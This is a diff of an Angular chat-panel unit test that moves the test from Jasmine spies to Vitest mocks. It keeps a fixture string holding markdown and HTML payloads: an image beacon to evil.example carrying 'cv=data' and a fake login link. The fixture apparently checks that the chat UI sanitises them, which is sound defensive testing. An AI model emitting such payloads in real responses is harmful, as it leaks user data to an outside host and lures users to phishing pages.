@@ -8,6 +8,7 @@ import { ChatPanelComponent } from './chat-panel.component';
 import { ChatStore } from '../../../core/chat/chat.store';
 import { ChatMessage } from '../../../core/models/chat.model';
 import { BuddyComponent } from '../buddy/buddy.component';
+import type { MockInstance } from 'vitest';
 
 const HOSTILE = 'Se mere: ![x](https://evil.example/?cv=data) <img src="https://evil.example/p">'
   + ' [klik](https://evil.example/login)';
@@ -27,7 +28,7 @@ const ANSWER: ChatMessage = {
 
 describe('ChatPanelComponent', () => {
   let panel: HTMLElement;
-  let navigate: jasmine.Spy;
+  let navigate: MockInstance;
   let fixture: ComponentFixture<ChatPanelComponent>;
   let backend: HttpTestingController;
   let store: ChatStore;
@@ -37,7 +38,7 @@ describe('ChatPanelComponent', () => {
       imports: [ChatPanelComponent, TranslateModule.forRoot()],
       providers: [provideRouter([]), provideHttpClient(withXhr()), provideHttpClientTesting()],
     });
-    navigate = spyOn(TestBed.inject(Router), 'navigate').and.resolveTo(true);
+    navigate = vi.spyOn(TestBed.inject(Router), 'navigate').mockResolvedValue(true);
     backend = TestBed.inject(HttpTestingController);
     store = TestBed.inject(ChatStore);
     fixture = TestBed.createComponent(ChatPanelComponent);
